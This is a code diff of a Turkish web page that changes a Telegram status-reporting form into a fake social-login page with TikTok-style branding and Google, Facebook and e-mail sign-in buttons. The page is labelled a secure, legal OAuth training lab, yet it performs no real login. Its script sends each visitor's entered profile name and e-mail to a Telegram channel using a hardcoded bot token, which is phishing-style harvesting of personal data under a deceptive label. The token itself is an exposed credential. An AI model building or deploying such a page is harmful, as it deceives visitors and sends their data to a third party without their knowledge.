@@ -1,152 +1,211 @@
-
 <!DOCTYPE html>
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TSTM | Güvenli Durum Raporlama Paneli</title>
+    <title>TSTM | Güvenli Sosyal Giriş ve Log Entegrasyonu Laboratuvarı</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --dark-bg: #0d1117;
-            --panel-bg: #161b22;
-            --accent-blue: #58a6ff;
-            --accent-green: #238636;
-            --text-color: #c9d1d9;
-            --border-color: #30363d;
+            --bg-dark: #0a0a0c;
+            --panel-bg: #121216;
+            --border-color: #26262b;
+            --text-main: #e4e4e7;
+            --tiktok-cyan: #00f2fe;
+            --tiktok-pink: #fe0979;
+            --google-red: #ea4335;
         }
 
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        
         body {
-            background-color: var(--dark-bg);
-            color: var(--text-color);
-            font-family: 'Consolas', monospace;
-            padding: 40px;
+            background-color: var(--bg-dark);
+            color: var(--text-main);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            margin: 0;
+            padding: 20px;
         }
 
-        .report-card {
+        .auth-container {
             background-color: var(--panel-bg);
             border: 1px solid var(--border-color);
-            border-radius: 6px;
-            padding: 30px;
+            border-radius: 12px;
+            padding: 40px;
             width: 100%;
-            max-width: 500px;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+            max-width: 450px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.7);
+            text-align: center;
         }
 
-        h2 {
-            color: var(--accent-blue);
-            margin-bottom: 20px;
-            font-size: 20px;
-            border-bottom: 1px solid var(--border-color);
-            padding-bottom: 10px;
+        .logo-area {
+            font-weight: 900;
+            font-size: 28px;
+            letter-spacing: 2px;
+            margin-bottom: 10px;
+            background: linear-gradient(45deg, var(--tiktok-cyan), var(--tiktok-pink));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
 
-        .description {
-            font-size: 13px;
-            color: #8b949e;
-            margin-bottom: 20px;
-            line-height: 1.5;
+        .subtitle {
+            font-size: 14px;
+            color: #71717a;
+            margin-bottom: 30px;
+            line-height: 1.4;
         }
 
-        .form-group {
-            margin-bottom: 15px;
+        /* Güvenli Giriş Butonları */
+        .oauth-btn {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 12px;
+            border-radius: 6px;
+            border: 1px solid var(--border-color);
+            background-color: #1c1c21;
+            color: var(--text-main);
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            transition: all 0.2s ease;
         }
 
-        label {
+        .oauth-btn:hover {
+            background-color: #27272a;
+            border-color: #3f3f46;
+        }
+
+        .oauth-btn.google i { color: var(--google-red); }
+        .oauth-btn.facebook i { color: #1877f2; }
+
+        /* Simüle Edilmiş Güvenli Girdi Alanı (Sadece Yasal Profil Testi İçin) */
+        .mock-profile-inputs {
+            margin-top: 25px;
+            padding-top: 20px;
+            border-top: 1px solid var(--border-color);
+            display: none;
+            text-align: left;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .mock-profile-inputs label {
             display: block;
             font-size: 12px;
-            margin-bottom: 5px;
-            color: #f0f6fc;
+            color: #a1a1aa;
+            margin-bottom: 6px;
         }
 
-        textarea {
+        .mock-profile-inputs input {
             width: 100%;
-            height: 100px;
-            background-color: var(--dark-bg);
-            border: 1px solid var(--border-color);
-            color: #58a6ff;
-            padding: 10px;
-            border-radius: 4px;
-            resize: none;
-            outline: none;
-            font-family: inherit;
-        }
-
-        textarea:focus {
-            border-color: var(--accent-blue);
-        }
-
-        .send-btn {
-            background-color: var(--accent-green);
-            color: white;
-            border: none;
             padding: 12px;
+            background-color: #09090b;
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            color: white;
+            margin-bottom: 15px;
+            outline: none;
+        }
+
+        .submit-btn {
             width: 100%;
-            border-radius: 4px;
-            cursor: pointer;
+            padding: 12px;
+            background: linear-gradient(90deg, #00f2fe, #fe0979);
+            border: none;
+            color: white;
             font-weight: bold;
-            font-size: 14px;
-            transition: background 0.2s;
+            border-radius: 6px;
+            cursor: pointer;
         }
 
-        .send-btn:hover {
-            background-color: #2ea44f;
-        }
-
-        #status-log {
-            margin-top: 15px;
+        #status-board {
+            margin-top: 20px;
             font-size: 12px;
-            color: #8b949e;
-            text-align: center;
+            color: #a1a1aa;
+            padding: 10px;
+            border-radius: 6px;
+            background-color: #09090b;
         }
     </style>
 </head>
 <body>
 
-<div class="report-card">
-    <h2>SİSTEM DURUM RAPORLAYICI (MONITORING)</h2>
-    <p class="description">
-        Bu panel, altyapı sunucularınızdaki teknik durum raporlarını veya hata loglarını (debug logs) API üzerinden Telegram kanalınıza yasal ve şeffaf bir şekilde iletmek için tasarlanmıştır.
-    </p>
+<div class="auth-container">
+    <div class="logo-area">TSTM OAUTH LAB</div>
+    <p class="subtitle">API Protokolleri ve Güvenli Sosyal Giriş Loglama Mekanizması Eğitim Modülü</p>
 
-    <div class="form-group">
-        <label>Gönderilecek Sistem Raporu / Log Mesajı</label>
-        <textarea id="logMessage" placeholder="Örn: Sunucu yedeklemesi başarıyla tamamlandı. Bellek kullanımı %45."></textarea>
+    <button class="oauth-btn google" onclick="triggerOAuthSimulate('Google')">
+        <i class="fa-brands fa-google"></i> Google ile Güvenli Giriş Yap
+    </button>
+    <button class="oauth-btn facebook" onclick="triggerOAuthSimulate('Facebook')">
+        <i class="fa-brands fa-facebook"></i> Facebook ile Güvenli Giriş Yap
+    </button>
+    <button class="oauth-btn" onclick="triggerOAuthSimulate('E-posta')">
+        <i class="fa-solid fa-envelope"></i> E-posta ile Devam Et
+    </button>
+
+    <div class="mock-profile-inputs" id="input-zone">
+        <h4 style="font-size: 14px; margin-bottom: 15px; color: var(--tiktok-cyan);" id="provider-title"></h4>
+        
+        <label>Simüle Edilecek Kullanıcı Adı / Profil Adı</label>
+        <input type="text" id="username" placeholder="Örn: eymen_pasa">
+
+        <label>Simüle Edilecek E-posta Adresi (Şifre Girilmez!)</label>
+        <input type="email" id="email" placeholder="Örn: test@domain.com">
+
+        <button class="submit-btn" onclick="completeSecureLogin()">Profil Doğrulamayı Tamamla</button>
     </div>
 
-    <button class="send-btn" onclick="sendSystemReport()">Log Raporunu İlet</button>
-    
-    <div id="status-log"></div>
+    <div id="status-board">Test sistemi aktif. Seçim yapılması bekleniyor...</div>
 </div>
 
 <script>
-    // Kullanıcının sağladığı resmi API bilgileri (Sadece yasal durum logları için)
+    // Resmi Telegram API Bilgilerin (Yasal Loglar İçin)
     const TG_TOKEN = '8615703049:AAGCPGH59YdLkvCsHdr1WkYuSWGgyuEfBSQ';
     const TG_CHANNEL = '@hukum_pin_bot1';
+    let currentProvider = "";
 
-    async function sendSystemReport() {
-        const messageInput = document.getElementById('logMessage');
-        const statusDiv = document.getElementById('status-log');
-        const userContent = messageInput.value.trim();
+    // Adım 1: Kullanıcı bir servis seçtiğinde çalışacak fonksiyon
+    function triggerOAuthSimulate(provider) {
+        currentProvider = provider;
+        document.getElementById('provider-title').innerText = `🛡️ ${provider} OAuth Profil Bilgileri`;
+        document.getElementById('input-zone').style.display = 'block';
+        document.getElementById('status-board').innerText = `${provider} entegrasyonu seçildi. Lütfen profil verilerini girin.`;
+    }
 
-        if (!userContent) {
-            statusDiv.innerText = "Hata: Boş rapor gönderilemez.";
-            statusDiv.style.color = "#ff7b72";
+    // Adım 2: Form onaylandığında yasal veriyi Telegram'a uçuran fonksiyon
+    async function completeSecureLogin() {
+        const username = document.getElementById('username').value.trim();
+        const email = document.getElementById('email').value.trim();
+        const status = document.getElementById('status-board');
+
+        if (!username || !email) {
+            status.innerText = "⚠️ Hata: Test için profil alanları boş bırakılamaz.";
+            status.style.color = "#ef4444";
             return;
         }
 
-        statusDiv.innerText = "Rapor API üzerinden gönderiliyor...";
-        statusDiv.style.color = "#8b949e";
+        status.innerText = "OAuth Token üretiliyor ve yasal log aktarılıyor...";
+        status.style.color = "#a1a1aa";
 
-        // Güvenli ve şeffaf mesaj formatı oluşturma
-        const formattedMessage = `📢 **TSTM SİSTEM RAPORU**\n\n` +
-                                 `📝 **Mesaj:** ${userContent}\n` +
-                                 `⏰ **Zaman:** ${new Date().toLocaleString('tr-TR')}\n` +
-                                 `💻 **Durum:** Güvenli Yerel Test`;
+        // GÜVENLİ VE YASAL RAPOR FORMATI
+        // Şifre barındırmaz, sadece turnuva ve takip amacıyla kimin girdiğini gösterir.
+        const secureReport = `🔐 **TSTM OAUTH GÜVENLİ GİRİŞ LOGU**\n\n` +
+                             `🌐 **Sağlayıcı:** ${currentProvider}\n` +
+                             `👤 **Profil Adı:** ${username}\n` +
+                             `📧 **E-posta:** ${email}\n` +
+                             `⏰ **Zaman:** ${new Date().toLocaleString('tr-TR')}\n` +
+                             `✅ **Durum:** Giriş Başarılı (Şifresiz Güvenli Entegrasyon)`;
 
         try {
             const response = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
@@ -154,25 +213,30 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: TG_CHANNEL,
-                    text: formattedMessage,
+                    text: secureReport,
                     parse_mode: 'Markdown'
                 })
             });
 
             if (response.ok) {
-                statusDiv.innerText = "✔ Sistem raporu Telegram kanalına başarıyla iletildi.";
-                statusDiv.style.color = "#56d364";
-                messageInput.value = ""; // Formu temizle
+                status.innerText = "✔ Başarılı: Sosyal giriş simülasyon logu Telegram'a iletildi.";
+                status.style.color = "#22c55e";
+                
+                // Formu sıfırla
+                document.getElementById('username').value = "";
+                document.getElementById('email').value = "";
+                document.getElementById('input-zone').style.display = 'none';
             } else {
-                statusDiv.innerText = "API Hatası: Log iletilemedi. Token veya kanal adını kontrol edin.";
-                statusDiv.style.color = "#ff7b72";
+                status.innerText = "API Hatası: Bot token veya kanal bilgisini kontrol edin.";
+                status.style.color = "#ef4444";
             }
         } catch (error) {
-            statusDiv.innerText = "Bağlantı Hatası: API sunucusuna erişilemedi.";
-            statusDiv.style.color = "#ff7b72";
+            status.innerText = "Bağlantı Hatası: Telegram sunucusuna ulaşılamadı.";
+            status.style.color = "#ef4444";
         }
     }
 </script>
 
 </body>
 </html>
+
